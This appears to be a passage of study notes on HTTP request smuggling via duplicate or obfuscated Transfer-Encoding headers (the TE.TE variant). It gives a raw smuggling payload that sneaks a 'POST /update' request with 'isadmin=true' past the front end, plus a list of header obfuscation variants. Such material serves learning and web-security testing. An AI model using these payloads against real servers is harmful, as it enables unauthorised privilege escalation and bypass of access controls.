
- **Both front-end & back-end use TE**.
	
- One of the servers is induced to not process TE by obfuscation
	
- Exploits **malformed or duplicate TE headers**.
    

📌 **Payload Example**

```http
POST / HTTP/1.1
Host: example.com
Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: chunked1

4e
POST /update HTTP/1.1
Host: example.com
Content-length: 15

isadmin=true
0
```
💥 Result:
- Front-end ignores malformed TE (`chunked1`) and uses chunked normally.    
- Back-end interprets differently (or falls back to CL).
- Smuggled request (`POST /update`) is executed.

# Obfuscation Techniques
There are potentially endless ways to obfuscate the `Transfer-Encoding` header. For example:

```HTTP
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x 

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked 

X: X[\n]Transfer-Encoding: chunked 

Transfer-Encoding
: chunked
```

It is necessary to find some variation of the TE header such that only one of the front-end or back-end servers processes it, while the other server ignores it.

